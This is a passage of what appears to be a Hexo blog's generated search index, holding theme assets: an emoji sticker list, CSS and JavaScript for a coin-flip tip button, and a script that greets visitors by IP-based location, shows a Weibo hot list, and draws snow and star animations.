src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Menhera-chan/97.jpg'>"},{"text":"Menhera-chan-119","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Menhera-chan/98.jpg'>"},{"text":"Menhera-chan-120","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Menhera-chan/99.jpg'>"}]},"Snow-Miku":{"type":"image","container":[{"text":"Snow-Miku-1","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583066@2x.png'>"},{"text":"Snow-Miku-2","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583067@2x.png'>"},{"text":"Snow-Miku-3","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583068@2x.png'>"},{"text":"Snow-Miku-4","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583069@2x.png'>"},{"text":"Snow-Miku-5","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583070@2x.png'>"},{"text":"Snow-Miku-6","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583071@2x.png'>"},{"text":"Snow-Miku-7","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583072@2x.png'>"},{"text":"Snow-Miku-8","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583073@2x.png'>"},{"text":"Snow-Miku-9","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583074@2x.png'>"},{"text":"Snow-Miku-10","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583075@2x.png'>"},{"text":"Snow-Miku-11","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583076@2x.png'>"},{"text":"Snow-Miku-12","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583077@2x.png'>"},{"text":"Snow-Miku-13","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583078@2x.png'>"},{"text":"Snow-Miku-14","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583079@2x.png'>"},{"text":"Snow-Miku-15","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583080@2x.png'>"},{"text":"Snow-Miku-16","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583081@2x.png'>"},{"text":"Snow-Miku-17","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583082@2x.png'>"},{"text":"Snow-Miku-18","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583083@2x.png'>"},{"text":"Snow-Miku-19","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583084@2x.png'>"},{"text":"Snow-Miku-20","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583085@2x.png'>"},{"text":"Snow-Miku-21","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583086@2x.png'>"},{"text":"Snow-Miku-22","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583087@2x.png'>"},{"text":"Snow-Miku-23","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583088@2x.png'>"},{"text":"Snow-Miku-24","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583089@2x.png'>"},{"text":"Snow-Miku-25","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583090@2x.png'>"},{"text":"Snow-Miku-26","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583091@2x.png'>"},{"text":"Snow-Miku-27","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583092@2x.png'>"},{"text":"Snow-Miku-28","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583093@2x.png'>"},{"text":"Snow-Miku-29","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583094@2x.png'>"},{"text":"Snow-Miku-30","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583095@2x.png'>"},{"text":"Snow-Miku-31","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583096@2x.png'>"},{"text":"Snow-Miku-32","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583097@2x.png'>"},{"text":"Snow-Miku-33","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583098@2x.png'>"},{"text":"Snow-Miku-34","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583099@2x.png'>"},{"text":"Snow-Miku-35","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583100@2x.png'>"},{"text":"Snow-Miku-36","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583101@2x.png'>"},{"text":"Snow-Miku-37","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583102@2x.png'>"},{"text":"Snow-Miku-38","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583103@2x.png'>"},{"text":"Snow-Miku-39","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583104@2x.png'>"},{"text":"Snow-Miku-40","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Snow-Miku/3583105@2x.png'>"}]}}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/coin.css"/>
      <url>/css/coin.css</url>
      
        <content type="html"><![CDATA[.tip-button {  border: 0;  border-radius: 0.25rem;  cursor: pointer;  font-size: 20px;  font-weight: 600;  height: 2.6rem;  margin-bottom: -4rem;  outline: 0;  position: relative;  top: 0;  transform-origin: 0% 100%;  transition: transform 50ms ease-in-out;  width: auto;  -webkit-tap-highlight-color: transparent;}.tip-button:active {  transform: rotate(4deg);}.tip-button.clicked {  animation: 150ms ease-in-out 1 shake;  pointer-events: none;}.tip-button.clicked .tip-button__text {  opacity: 0;  transition: opacity 100ms linear 200ms;}.tip-button.clicked::before {  height: 0.5rem;  width: 60%;  background: var(button-hover-color);}.tip-button.clicked .coin {  transition: margin-bottom 1s linear 200ms;  margin-bottom: 0;}.tip-button.shrink-landing::before {  transition: width 200ms ease-in;  width: 0;}.tip-button.coin-landed::after {  opacity: 1;  transform: scale(1);  transform-origin: 50% 100%;}.tip-button.coin-landed .coin-wrapper {  background: radial-gradient(circle at 35% 97%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.04rem), radial-gradient(circle at 45% 92%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.02rem), radial-gradient(circle at 55% 98%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.04rem), radial-gradient(circle at 65% 96%, rgba(3, 16, 50, 0.4) 0.06rem, transparent 0.06rem);  background-position: center bottom;  background-size: 100%;  bottom: -1rem;  opacity: 0;  transform: scale(2) translateY(-10px);}.tip-button__text {  color: #fff;  margin-right: 1.8rem;  opacity: 1;  position: relative;  transition: opacity 100ms linear 500ms;  z-index: 3;}.tip-button::before {  border-radius: 0.25rem;  bottom: 0;  content: '';  display: block;  height: 100%;  left: 50%;  position: absolute;  transform: translateX(-50%);  transition: height 250ms ease-in-out 400ms, width 250ms ease-in-out 300ms;  width: 100%;  z-index: 2;}.tip-button::after {  bottom: -1rem;  color: white;  content: 'ヾ(≧O≦)〃嗷~';  height: 110%;  left: 0;  opacity: 0;  position: absolute;  pointer-events: none;  text-align: center;  transform: scale(0);  transform-origin: 50% 20%;  transition: transform 200ms cubic-bezier(0, 0, 0.35, 1.43);  width: 100%;  z-index: 1;}.coin-wrapper {  background: none;  bottom: 0;  height: 18rem;  left: 0;  opacity: 1;  overflow: hidden;  pointer-events: none;  position: absolute;  transform: none;  transform-origin: 50% 100%;  transition: opacity 200ms linear 100ms, transform 300ms ease-out;  width: 100%;}.coin {  --front-y-multiplier: 0;  --back-y-multiplier: 0;  --coin-y-multiplier: 0;  --coin-x-multiplier: 0;  --coin-scale-multiplier: 0;  --coin-rotation-multiplier: 0;  --shine-opacity-multiplier: 0.4;  --shine-bg-multiplier: 50%;  bottom: calc(var(--coin-y-multiplier) * 1rem - 3.5rem);  height: 3.5rem;  margin-bottom: 3.05rem;  position: absolute;  right: calc(var(--coin-x-multiplier) * 34% + 16%);  transform: translateX(50%) scale(calc(0.4 + var(--coin-scale-multiplier))) rotate(calc(var(--coin-rotation-multiplier) * -1deg));  transition: opacity 100ms linear 200ms;  width: 3.5rem;  z-index: 3;}.coin__front, .coin__middle, .coin__back, .coin::before, .coin__front::after, .coin__back::after {  border-radius: 50%;  box-sizing: border-box;  height: 100%;  left: 0;  position: absolute;  width: 100%;  z-index: 3;}.coin__front {  background: radial-gradient(circle at 50% 50%, transparent 50%, rgba(115, 124, 153, 0.4) 54%, #c2cadf 54%), linear-gradient(210deg, #8590b3 32%, transparent 32%), linear-gradient(150deg, #8590b3 32%, transparent 32%), linear-gradient(to right, #8590b3 22%, transparent 22%, transparent 78%, #8590b3 78%), linear-gradient(to bottom, #fcfaf9 44%, transparent 44%, transparent 65%, #fcfaf9 65%, #fcfaf9 71%, #8590b3 71%), linear-gradient(to right, transparent 28%, #fcfaf9 28%, #fcfaf9 34%, #8590b3 34%, #8590b3 40%, #fcfaf9 40%, #fcfaf9 47%, #8590b3 47%, #8590b3 53%, #fcfaf9 53%, #fcfaf9 60%, #8590b3 60%, #8590b3 66%, #fcfaf9 66%, #fcfaf9 72%, transparent 72%);  background-color: #8590b3;  background-size: 100% 100%;  transform: translateY(calc(var(--front-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--front-scale-multiplier));}.coin__front::after {  background: rgba(0, 0, 0, 0.2);  content: '';  opacity: var(--front-y-multiplier);}.coin__middle {  background: #737c99;  transform: translateY(calc(var(--middle-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--middle-scale-multiplier));}.coin__back {  background: radial-gradient(circle at 50% 50%, transparent 50%, rgba(115, 124, 153, 0.4) 54%, #c2cadf 54%), radial-gradient(circle at 50% 40%, #fcfaf9 23%, transparent 23%), radial-gradient(circle at 50% 100%, #fcfaf9 35%, transparent 35%);  background-color: #8590b3;  background-size: 100% 100%;  transform: translateY(calc(var(--back-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--back-scale-multiplier));}.coin__back::after {  background: rgba(0, 0, 0, 0.2);  content: '';  opacity: var(--back-y-multiplier);}.coin::before {  background: radial-gradient(circle at 25% 65%, transparent 50%, rgba(255, 255, 255, 0.9) 90%), linear-gradient(55deg, transparent calc(var(--shine-bg-multiplier) + 0%), #e9f4ff calc(var(--shine-bg-multiplier) + 0%), transparent calc(var(--shine-bg-multiplier) + 50%));  content: '';  opacity: var(--shine-opacity-multiplier);  transform: translateY(calc(var(--middle-y-multiplier) * 0.3181818182rem / -2)) scaleY(var(--middle-scale-multiplier)) rotate(calc(var(--coin-rotation-multiplier) * 1deg));  z-index: 10;}.coin::after {  background: #737c99;  content: '';  height: 0.3181818182rem;  left: 0;  position: absolute;  top: 50%;  transform: translateY(-50%);  width: 100%;  z-index: 2;}@keyframes shake {  0% {    transform: rotate(4deg);  }  66% {    transform: rotate(-4deg);  }  100% {    transform: rotate();  }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/coin.js"/>
      <url>/js/coin.js</url>
      
        <content type="html"><![CDATA[var tipButtons = document.querySelectorAll('.tip-button')function coinAudio() {    var coinAudio = document.getElementById("coinAudio");    if (coinAudio) {        coinAudio.play();    }}tipButtons.forEach((button) => {    var coin = button.querySelector('.coin')    coin.maxMoveLoopCount = 90    button.addEventListener('click', () => {        if (/Android|webOS|BlackBerry/i.test(navigator.userAgent)) return true;         if (button.clicked) return        button.classList.add('clicked')        setTimeout(() => {            coin.sideRotationCount = Math.floor(Math.random() * 5) * 90            coin.maxFlipAngle = (Math.floor(Math.random() * 4) + 3) * Math.PI            button.clicked = true            flipCoin()            coinAudio()        }, 50)    })    var flipCoin = () => {        coin.moveLoopCount = 0        flipCoinLoop()    }    var resetCoin = () => {        coin.style.setProperty('--coin-x-multiplier', 0)        coin.style.setProperty('--coin-scale-multiplier', 0)        coin.style.setProperty('--coin-rotation-multiplier', 0)        coin.style.setProperty('--shine-opacity-multiplier', 0.4)        coin.style.setProperty('--shine-bg-multiplier', '50%')        coin.style.setProperty('opacity', 1)        setTimeout(() => {            button.clicked = false        }, 300)    }    var flipCoinLoop = () => {        coin.moveLoopCount++        var percentageCompleted = coin.moveLoopCount / coin.maxMoveLoopCount        coin.angle = -coin.maxFlipAngle * Math.pow((percentageCompleted - 1), 2) + coin.maxFlipAngle        coin.style.setProperty('--coin-y-multiplier', -11 * Math.pow(percentageCompleted * 2 - 1, 4) + 11)        coin.style.setProperty('--coin-x-multiplier', percentageCompleted)        coin.style.setProperty('--coin-scale-multiplier', percentageCompleted * 0.6)        coin.style.setProperty('--coin-rotation-multiplier', percentageCompleted * coin.sideRotationCount)        coin.style.setProperty('--front-scale-multiplier', Math.max(Math.cos(coin.angle), 0))        coin.style.setProperty('--front-y-multiplier', Math.sin(coin.angle))        coin.style.setProperty('--middle-scale-multiplier', Math.abs(Math.cos(coin.angle), 0))        coin.style.setProperty('--middle-y-multiplier', Math.cos((coin.angle + Math.PI / 2) % Math.PI))        coin.style.setProperty('--back-scale-multiplier', Math.max(Math.cos(coin.angle - Math.PI), 0))        coin.style.setProperty('--back-y-multiplier', Math.sin(coin.angle - Math.PI))        coin.style.setProperty('--shine-opacity-multiplier', 4 * Math.sin((coin.angle + Math.PI / 2) % Math.PI) - 3.2)        coin.style.setProperty('--shine-bg-multiplier', -40 * (Math.cos((coin.angle + Math.PI / 2) % Math.PI) - 0.5) + '%')        if (coin.moveLoopCount < coin.maxMoveLoopCount) {            if (coin.moveLoopCount === coin.maxMoveLoopCount - 6) button.classList.add('shrink-landing')            window.requestAnimationFrame(flipCoinLoop)        } else {            button.classList.add('coin-landed')            coin.style.setProperty('opacity', 0)            setTimeout(() => {                button.classList.remove('clicked', 'shrink-landing', 'coin-landed')                setTimeout(() => {                    resetCoin()                }, 300)            }, 1500)        }    }})]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>动画</title>
      <link href="/box/animation/index.html"/>
      <url>/box/animation/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/fomal.js"/>
      <url>/js/fomal.js</url>
      
        <content type="html"><![CDATA[document.addEventListener('pjax:complete', function () {  window.onscroll = percent;});document.addEventListener('DOMContentLoaded', function () {  window.onscroll = percent;});function percent() {  try {    rmf.showRightMenu(false);    $('.rmMask').attr('style', 'display: none');  } catch (err) {  }  let a = document.documentElement.scrollTop,    b = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.body.clientHeight, document.documentElement.clientHeight) - document.documentElement.clientHeight, // 整个网页高度 减去 可视高度    result = Math.round(a / b * 100),    btn = document.querySelector("#go-up");   if (result < 95) {    btn.childNodes[0].style.display = 'none'    btn.childNodes[1].style.display = 'block'    btn.childNodes[1].innerHTML = result + '<span>%</span>';  } else {    btn.childNodes[1].style.display = 'none'    btn.childNodes[0].style.display = 'block'  }}document.addEventListener('pjax:complete', tonav);document.addEventListener('DOMContentLoaded', tonav);function tonav() {  document.getElementById("name-container").setAttribute("style", "display:none");  var position = $(window).scrollTop();  $(window).scroll(function () {    var scroll = $(window).scrollTop();    if (scroll > position) {      document.getElementById("name-container").setAttribute("style", "");      document.getElementsByClassName("menus_items")[1].setAttribute("style", "display:none!important");    } else {      document.getElementsByClassName("menus_items")[1].setAttribute("style", "");      document.getElementById("name-container").setAttribute("style", "display:none");    }    position = scroll;  });  document.getElementById("page-name").innerText = document.title.split(" | 梦~醒🥝")[0];}function scrollToTop() {  document.getElementsByClassName("menus_items")[1].setAttribute("style", "");  document.getElementById("name-container").setAttribute("style", "display:none");  btf.scrollToDest(0, 500);}$.ajax({  type: 'get',  url: 'https://apis.map.qq.com/ws/location/v1/ip',  data: {    key: '3IPBZ-CIUWM-E5O6O-6Z6RI-TZGWV-6SBG5',    output: 'jsonp',  },  dataType: 'jsonp',  success: function (res) {    ipLoacation = res;  }})function getDistance(e1, n1, e2, n2) {  const R = 6371  const { sin, cos, asin, PI, hypot } = Math  let getPoint = (e, n) => {    e *= PI / 180    n *= PI / 180    return { x: cos(n) * cos(e), y: cos(n) * sin(e), z: sin(n) }  }  let a = getPoint(e1, n1)  let b = getPoint(e2, n2)  let c = hypot(a.x - b.x, a.y - b.y, a.z - b.z)  let r = asin(c / 2) * 2 * R  return Math.round(r);}function showWelcome() {  let dist = getDistance(114.335981, 30.583783, ipLoacation.result.location.lng, ipLoacation.result.location.lat); //这里换成自己的经纬度  let pos = ipLoacation.result.ad_info.nation;  let ip;  let posdesc;  switch (ipLoacation.result.ad_info.nation) {    case "日本":      posdesc = "よろしく，一起去看樱花吗";      break;    case "美国":      posdesc = "Let us live in peace!";      break;    case "英国":      posdesc = "想同你一起夜乘伦敦眼";      break;    case "俄罗斯":      posdesc = "干了这瓶伏特加！";      break;    case "法国":      posdesc = "C'est La Vie";      break;    case "德国":      posdesc = "Die Zeit verging im Fluge.";      break;    case "澳大利亚":      posdesc = "一起去大堡礁吧！";      break;    case "加拿大":      posdesc = "拾起一片枫叶赠予你";      break;    case "中国":      pos = ipLoacation.result.ad_info.province + " " + ipLoacation.result.ad_info.city + " " + ipLoacation.result.ad_info.district;      ip = ipLoacation.result.ip;      switch (ipLoacation.result.ad_info.province) {        case "北京市":          posdesc = "北——京——欢迎你~~~";          break;        case "天津市":          posdesc = "讲段相声吧。";          break;        case "河北省":          posdesc = "山势巍巍成壁垒，天下雄关。铁马金戈由此向，无限江山。";          break;        case "山西省":          posdesc = "展开坐具长三尺，已占山河五百余。";          break;        case "内蒙古自治区":          posdesc = "天苍苍，野茫茫，风吹草低见牛羊。";          break;        case "辽宁省":          posdesc = "我想吃烤鸡架！";          break;        case "吉林省":          posdesc = "状元阁就是东北烧烤之王。";          break;        case "黑龙江省":          posdesc = "很喜欢哈尔滨大剧院。";          break;        case "上海市":          posdesc = "众所周知，中国只有两个城市。";          break;        case "江苏省":          switch (ipLoacation.result.ad_info.city) {            case "南京市":              posdesc = "这是我挺想去的城市啦。";              break;            case "苏州市":              posdesc = "上有天堂，下有苏杭。";              break;            default:              posdesc = "散装是必须要散装的。";              break;          }          break;        case "浙江省":          posdesc = "东风渐绿西湖柳，雁已还人未南归。";          break;        case "河南省":          switch (ipLoacation.result.ad_info.city) {            case "郑州市":              posdesc = "豫州之域，天地之中。";              break;            case "南阳市":              posdesc = "臣本布衣，躬耕于南阳。此南阳非彼南阳！";              break;            case "驻马店市":              posdesc = "峰峰有奇石，石石挟仙气。嵖岈山的花很美哦！";              break;            case "开封市":              posdesc = "刚正不阿包青天。";              break;            case "洛阳市":              posdesc = "洛阳牡丹甲天下。";              break;            default:              posdesc = "可否带我品尝河南烩面啦？";              break;          }          break;        case "安徽省":          posdesc = "蚌埠住了，芜湖起飞。";          break;        case "福建省":          posdesc = "井邑白云间，岩城远带山。";          break;        case "江西省":          posdesc = "落霞与孤鹜齐飞，秋水共长天一色。";          break;        case "山东省":          posdesc = "遥望齐州九点烟，一泓海水杯中泻。";          break;        case "湖北省":          posdesc = "来碗热干面！";          break;        case "湖南省":          posdesc = "74751，长沙斯塔克。";          break;        case "广东省":          posdesc = "老板来两斤福建人。";          break;        case "广西壮族自治区":          posdesc = "桂林山水甲天下。";          break;        case "海南省":          posdesc = "朝观日出逐白浪，夕看云起收霞光。";          break;        case "四川省":          posdesc = "康康川妹子。";          break;        case "贵州省":          posdesc = "茅台，学生，再塞200。";          break;        case "云南省":          posdesc = "玉龙飞舞云缠绕，万仞冰川直耸天。";          break;        case "西藏自治区":          posdesc = "躺在茫茫草原上，仰望蓝天。";          break;        case "陕西省":          posdesc = "来份臊子面加馍。";          break;        case "甘肃省":          posdesc = "羌笛何须怨杨柳，春风不度玉门关。";          break;        case "青海省":          posdesc = "牛肉干和老酸奶都好好吃。";          break;        case "宁夏回族自治区":          posdesc = "大漠孤烟直，长河落日圆。";          break;        case "新疆维吾尔自治区":          posdesc = "驼铃古道丝绸路，胡马犹闻唐汉风。";          break;        case "台湾省":          posdesc = "我在这头，大陆在那头。";          break;        case "香港特别行政区":          posdesc = "永定贼有残留地鬼嚎，迎击光非岁玉。";          break;        case "澳门特别行政区":          posdesc = "性感荷官，在线发牌。";          break;        default:          posdesc = "带我去你的城市逛逛吧！";          break;      }      break;    default:      posdesc = "带我去你的国家逛逛吧。";      break;  }  let timeChange;  let date = new Date();  if (date.getHours() >= 5 && date.getHours() < 11) timeChange = "<span>上午好</span>，一日之计在于晨！";  else if (date.getHours() >= 11 && date.getHours() < 13) timeChange = "<span>中午好</span>，该摸鱼吃午饭了。";  else if (date.getHours() >= 13 && date.getHours() < 15) timeChange = "<span>下午好</span>，懒懒地睡个午觉吧！";  else if (date.getHours() >= 15 && date.getHours() < 16) timeChange = "<span>三点几啦</span>，一起饮茶呀！";  else if (date.getHours() >= 16 && date.getHours() < 19) timeChange = "<span>夕阳无限好！</span>";  else if (date.getHours() >= 19 && date.getHours() < 24) timeChange = "<span>晚上好</span>，夜生活嗨起来！";  else timeChange = "夜深了，早点休息，少熬夜。";  try {    document.getElementById("welcome-info").innerHTML =      `<b><center>🎉 欢迎信息 🎉</center>&emsp;&emsp;欢迎来自 <span style="color:var(--theme-color)">${pos}</span> 的小伙伴，${timeChange}您现在距离站长约 <span style="color:var(--theme-color)">${dist}</span> 公里，当前的IP地址为： <span style="color:var(--theme-color)">${ip}</span>， ${posdesc}</b>`;  } catch (err) {    console.log("虽然不知道你是哪里人，但同在一个地球，欢迎欢迎🎉🎉🎉")  }}window.onload = showWelcome;document.addEventListener('pjax:complete', showWelcome);document.addEventListener('pjax:complete', getWeibo);document.addEventListener('DOMContentLoaded', getWeibo);function getWeibo() {  fetch('').then(data => data.json()).then(data => {    let html = '<style>.weibo-new{background:#ff3852}.weibo-hot{background:#ff9406}.weibo-jyzy{background:#ffc000}.weibo-recommend{background:#00b7ee}.weibo-adrecommend{background:#febd22}.weibo-friend{background:#8fc21e}.weibo-boom{background:#bd0000}.weibo-topic{background:#ff6f49}.weibo-topic-ad{background:#4dadff}.weibo-boil{background:#f86400}#weibo-container{overflow-y:auto;-ms-overflow-style:none;scrollbar-width:none}#weibo-container::-webkit-scrollbar{display:none}.weibo-list-item{display:flex;flex-direction:row;justify-content:space-between;flex-wrap:nowrap}.weibo-title{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-right:auto}.weibo-num{float:right}.weibo-hotness{display:inline-block;padding:0 6px;transform:scale(.8) translateX(-3px);color:#fff;border-radius:8px}</style>'    html += '<div class="weibo-list">'    let hotness = {      '爆': 'weibo-boom',      '热': 'weibo-hot',      '沸': 'weibo-boil',      '新': 'weibo-new',      '荐': 'weibo-recommend',      '音': 'weibo-jyzy',      '影': 'weibo-jyzy',      '剧': 'weibo-jyzy',      '综': 'weibo-jyzy'    }    for (let item of data) {      html += '<div class="weibo-list-item"><div class="weibo-hotness ' + hotness[(item.hot || '荐')] + '">' + (item.hot || '荐') + '</div>'        + '<span class="weibo-title"><a title="' + item.title + '"href="' + item.url + '" target="_blank" rel="external nofollow noreferrer" style="color:#a08ed5">' + item.title + '</a></span>'        + '<div class="weibo-num"><span>' + item.num + '</span></div></div>'    }    html += '</div>'    document.getElementById('weibo-container').innerHTML = html  }).catch(function (error) {    console.log(error);  });}let TT = null;  function debounce(fn, time) {  if (TT !== null) clearTimeout(TT);  TT = setTimeout(fn, time);}document.addEventListener("copy", function () {  debounce(function () {    new Vue({      data: function () {        this.$notify({          title: "哎嘿！复制成功🍬",          message: "若要转载最好保留原文链接哦，给你一个大大的赞！",          position: 'top-left',          offset: 50,          showClose: true,          type: "success",          duration: 5000        });      }    })  }, 300);})document.onkeydown = function (e) {  if (123 == e.keyCode || (e.ctrlKey && e.shiftKey && (74 === e.keyCode || 73 === e.keyCode || 67 === e.keyCode)) || (e.ctrlKey && 85 === e.keyCode)) {    debounce(function () {      new Vue({        data: function () {          this.$notify({            title: "你已被发现😜",            message: "小伙子，扒源记住要遵循GPL协议！",            position: 'top-left',            offset: 50,            showClose: true,            type: "warning",            duration: 5000          });        }      })    }, 300);  }};if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {} else {  // document.write('<canvas id="snow" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:-2;pointer-events:none"></canvas>');  window && (() => {    let e = {      flakeCount: 50,       minDist: 150,        color: "255, 255, 255",       size: 1.5,        speed: .5,       opacity: .7,        stepsize: .5     };    const t = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || function (e) {      window.setTimeout(e, 1e3 / 60)    }      ;    window.requestAnimationFrame = t;    const i = document.getElementById("snow"),      n = i.getContext("2d"),      o = e.flakeCount;    let a = -100,      d = -100,      s = [];    i.width = window.innerWidth,      i.height = window.innerHeight;    const h = () => {      n.clearRect(0, 0, i.width, i.height);      const r = e.minDist;      for (let t = 0; t < o; t++) {        let o = s[t];        const h = a,          w = d,          m = o.x,          c = o.y,          p = Math.sqrt((h - m) * (h - m) + (w - c) * (w - c));        if (p < r) {          const e = (h - m) / p,            t = (w - c) / p,            i = r / (p * p) / 2;          o.velX -= i * e,            o.velY -= i * t        } else          o.velX *= .98,            o.velY < o.speed && o.speed - o.velY > .01 && (o.velY += .01 * (o.speed - o.velY)),            o.velX += Math.cos(o.step += .05) * o.stepSize;        n.fillStyle = "rgba(" + e.color + ", " + o.opacity + ")",          o.y += o.velY,          o.x += o.velX,          (o.y >= i.height || o.y <= 0) && l(o),          (o.x >= i.width || o.x <= 0) && l(o),          n.beginPath(),          n.arc(o.x, o.y, o.size, 0, 2 * Math.PI),          n.fill()      }      t(h)    }      , l = e => {        e.x = Math.floor(Math.random() * i.width),          e.y = 0,          e.size = 3 * Math.random() + 2,          e.speed = 1 * Math.random() + .5,          e.velY = e.speed,          e.velX = 0,          e.opacity = .5 * Math.random() + .3      }      ;    document.addEventListener("mousemove", (e => {      a = e.clientX,        d = e.clientY    }    )),      window.addEventListener("resize", (() => {        i.width = window.innerWidth,          i.height = window.innerHeight      }      )),      (() => {        for (let t = 0; t < o; t++) {          const t = Math.floor(Math.random() * i.width)            , n = Math.floor(Math.random() * i.height)            , o = 3 * Math.random() + e.size            , a = 1 * Math.random() + e.speed            , d = .5 * Math.random() + e.opacity;          s.push({            speed: a,            velX: 0,            velY: a,            x: t,            y: n,            size: o,            stepSize: Math.random() / 30 * e.stepsize,            step: 0,            angle: 180,            opacity: d          })        }        h()      }      )()  }  )();}function dark() {  window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;  var n, e, i, h, t = .05,    s = document.getElementById("universe"),    o = !0,    a = "180,184,240",    r = "226,225,142",    d = "226,225,224",    c = [];  function f() {    n = window.innerWidth, e = window.innerHeight, i = .216 * n, s.setAttribute("width", n), s.setAttribute("height", e)  }  function u() {    h.clearRect(0, 0, n, e);    for (var t = c.length, i = 0; i < t; i++) {      var s = c[i];      s.move(), s.fadeIn(), s.fadeOut(), s.draw()    }  }  function y() {    this.reset = function () {      this.giant = m(3), this.comet = !this.giant && !o && m(10), this.x = l(0, n - 10), this.y = l(0, e), this.r = l(1.1, 2.6), this.dx = l(t, 6 * t) + (this.comet + 1 - 1) * t * l(50, 120) + 2 * t, this.dy = -l(t, 6 * t) - (this.comet + 1 - 1) * t * l(50, 120), this.fadingOut = null, this.fadingIn = !0, this.opacity = 0, this.opacityTresh = l(.2, 1 - .4 * (this.comet + 1 - 1)), this.do = l(5e-4, .002) + .001 * (this.comet + 1 - 1)    }, this.fadeIn = function () {      this.fadingIn && (this.fadingIn = !(this.opacity > this.opacityTresh), this.opacity += this.do)    }, this.fadeOut = function () {      this.fadingOut && (this.fadingOut = !(this.opacity < 0), this.opacity -= this.do / 2, (this.x > n || this.y < 0) && (this.fadingOut = !1, this.reset()))    }, this.draw = function () {      if (h.beginPath(), this.giant) h.fillStyle = "rgba(" + a + "," + this.opacity + ")", h.arc(this.x, this.y, 2, 0, 2 * Math.PI, !1); else if (this.comet) {        h.fillStyle = "rgba(" + d + "," + this.opacity + 